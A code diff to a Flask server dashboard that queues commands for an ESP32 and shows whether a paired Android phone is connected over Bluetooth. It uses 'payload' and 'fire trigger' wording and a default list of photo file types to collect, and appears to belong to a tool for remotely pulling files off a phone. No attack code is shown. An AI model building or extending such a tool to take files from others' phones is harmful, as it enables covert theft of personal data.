@@ -163,6 +163,9 @@ _pending_cmd: dict = None
 # ESP32 heartbeat: last time the ESP32 called /api/poll
 _esp32_last_seen: float = 0.0
 
+# BLE connection state: True when ESP32 reports Android is paired & connected
+_ble_connected: bool = False
+
 # File-type config — which extensions the ESP32 should collect
 # Dashboard can update this via POST /api/config
 DEFAULT_EXTS = ["jpg", "jpeg", "png", "webp", "heic", "gif",
@@ -553,6 +556,7 @@ def api_stats():
         "history":       list(_upload_events)[:50],
         "esp32_online":  age is not None and age < 10,
         "esp32_age_s":   round(age, 1) if age is not None else None,
+        "ble_connected": _ble_connected,
         "pending_cmd":   _pending_cmd is not None,
         "active_exts":   _active_exts,
     }), 200
@@ -564,10 +568,14 @@ def api_poll():
     """
     ESP32 polls this every 2 s to check for a pending web-trigger command.
     Returns the command and clears it, or {"cmd": null} if nothing pending.
-    Also records the ESP32 heartbeat timestamp.
+    Also records the ESP32 heartbeat timestamp and BLE connection state.
+    Query params:
+      ?ble=1   — Android is paired & connected
+      ?ble=0   — Android not connected (default if omitted)
     """
-    global _pending_cmd, _esp32_last_seen
+    global _pending_cmd, _esp32_last_seen, _ble_connected
     _esp32_last_seen = time.time()
+    _ble_connected   = request.args.get("ble", "0") == "1"
     if _pending_cmd:
         cmd = dict(_pending_cmd)
         _pending_cmd = None   # consume — one-shot
@@ -1038,6 +1046,12 @@ tbody td{padding:7px 10px;color:#cbd5e1;white-space:nowrap}
       <div style="margin-left:auto;font-size:.72rem;color:var(--muted)" id="ctrl-last-seen"></div>
     </div>
 
+    <!-- BLE / Android connection status banner -->
+    <div id="ble-status-row" style="display:none;align-items:center;gap:12px;padding:11px 18px;border-radius:10px;border:1px solid var(--border);background:var(--surface);margin-bottom:16px">
+      <div id="ble-dot" style="width:10px;height:10px;border-radius:50%;background:var(--muted);flex-shrink:0"></div>
+      <div id="ble-status-text" style="font-size:.82rem;font-weight:600;color:var(--muted)">Android — waiting...</div>
+    </div>
+
     <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
 
       <!-- File type selector -->
@@ -1378,40 +1392,56 @@ async function saveExtConfig() {
 
 async function fireTrigger() {
   const btn = document.getElementById('trigger-btn');
-  btn.disabled = true; btn.style.opacity = '.5';
+  btn.disabled = true; btn.style.opacity = '.6';
   const exts = [..._selExts];
-  if (!exts.length) { setResult('Select at least one file type first.', 'var(--red)'); btn.disabled=false; btn.style.opacity='1'; return; }
+  if (!exts.length) {
+    setResult('Select at least one file type first.', 'var(--red)');
+    btn.disabled = false; btn.style.opacity = '1'; return;
+  }
   try {
     const r = await fetch('/trigger', {
       method: 'POST',
-      headers: {'Content-Type':'application/json'},
+      headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({exts})
     });
+    if (r.status === 401) {
+      setResult('Auth error — set UPLOAD_TOKEN in .env', 'var(--red)');
+      btn.disabled = false; btn.style.opacity = '1'; return;
+    }
     const d = await r.json();
     if (d.ok) {
-      setResult('✓ Payload queued — ESP32 will pick it up within 2 s', 'var(--green)');
+      setResult('✓ Queued — ESP32 picks it up within 2 s', 'var(--green)');
       const ts = new Date().toLocaleTimeString();
-      _triggerLog.unshift('<div style="color:var(--green)">' + ts + ' — queued · ' + exts.length + ' file types</div>');
+      const esp32State = (_lastData && _lastData.esp32_online) ? 'ESP32 online' : 'ESP32 offline — will fire when it connects';
+      _triggerLog.unshift(
+        '<div style="display:flex;gap:8px;align-items:baseline">' +
+        '<span style="color:var(--green);font-weight:600">' + ts + '</span>' +
+        '<span style="color:#f1f5f9">' + exts.length + ' types</span>' +
+        '<span style="color:var(--muted);font-size:.68rem">' + esp32State + '</span>' +
+        '</div>'
+      );
       if (_triggerLog.length > 20) _triggerLog.pop();
       document.getElementById('trigger-log').innerHTML = _triggerLog.join('');
     } else {
-      setResult('Server error: ' + JSON.stringify(d), 'var(--red)');
+      setResult('Error: ' + JSON.stringify(d), 'var(--red)');
     }
   } catch(e) {
     setResult('Request failed — is the server running?', 'var(--red)');
   }
-  setTimeout(() => { btn.disabled=false; btn.style.opacity='1'; }, 3000);
+  setTimeout(() => { btn.disabled = false; btn.style.opacity = '1'; }, 2000);
 }
 
 function setResult(msg, col) {
   const el = document.getElementById('trigger-result');
   el.style.color = col; el.textContent = msg;
-  setTimeout(() => { el.textContent = ''; }, 6000);
+  setTimeout(() => { el.textContent = ''; }, 7000);
 }
 
 function updateControlPanel(d) {
-  // ESP32 status
-  const online = d.esp32_online;
+  const online    = d.esp32_online;
+  const bleConn   = d.ble_connected;
+
+  // ── ESP32 WiFi / polling status ────────────────────────────────────────
   const dot = document.getElementById('ctrl-dot');
   const txt = document.getElementById('ctrl-status-text');
   const sub = document.getElementById('ctrl-status-sub');
@@ -1419,28 +1449,51 @@ function updateControlPanel(d) {
   if (online) {
     dot.style.background = 'var(--green)';
     txt.textContent = 'ESP32 — Online';
-    sub.textContent = 'Polling active — ready to receive commands';
+    sub.textContent = 'Polling every 2 s — ready to receive commands';
     ls.textContent  = 'Last seen ' + d.esp32_age_s + ' s ago';
   } else if (d.esp32_age_s !== null) {
     dot.style.background = 'var(--amber)';
     txt.textContent = 'ESP32 — Not responding';
-    sub.textContent = 'No heartbeat in ' + d.esp32_age_s + ' s — is the ESP32 powered on?';
+    sub.textContent = 'No poll in ' + d.esp32_age_s + ' s — is the ESP32 powered and on WiFi?';
     ls.textContent  = '';
   } else {
     dot.style.background = 'var(--muted)';
     txt.textContent = 'ESP32 — Not seen';
-    sub.textContent = 'Flash and power on the ESP32 to begin polling';
+    sub.textContent = 'Flash firmware, set WiFi credentials, and power on';
     ls.textContent  = '';
   }
-  // Fire button state
+
+  // ── BLE / Android connection status ───────────────────────────────────
+  const bleRow = document.getElementById('ble-status-row');
+  const bleDot = document.getElementById('ble-dot');
+  const bleTxt = document.getElementById('ble-status-text');
+  if (online) {
+    bleRow.style.display = '';
+    if (bleConn) {
+      bleDot.style.background = 'var(--green)';
+      bleTxt.textContent = 'Android — Paired & Connected';
+      bleTxt.style.color = 'var(--green)';
+    } else {
+      bleDot.style.background = 'var(--amber)';
+      bleTxt.textContent = 'Android — Not connected (pair via Bluetooth settings)';
+      bleTxt.style.color = 'var(--amber)';
+    }
+  } else {
+    bleRow.style.display = 'none';
+  }
+
+  // ── Fire button — always clickable, no gating ──────────────────────────
+  // Command is queued on server and ESP32 picks it up when it connects.
   const btn = document.getElementById('trigger-btn');
   if (!btn.disabled) {
-    btn.style.opacity = online ? '1' : '.45';
-    btn.title = online ? '' : 'ESP32 must be online to trigger';
+    btn.style.opacity = '1';
+    btn.title = '';
   }
-  // Pending warning
+
+  // ── Pending warning ───────────────────────────────────────────────────
   document.getElementById('ctrl-pending-warn').style.display = d.pending_cmd ? '' : 'none';
-  // Build ext grid once with server's active_exts
+
+  // ── Build ext grid once ───────────────────────────────────────────────
   if (d.active_exts) buildExtGrid(d.active_exts);
 }
 
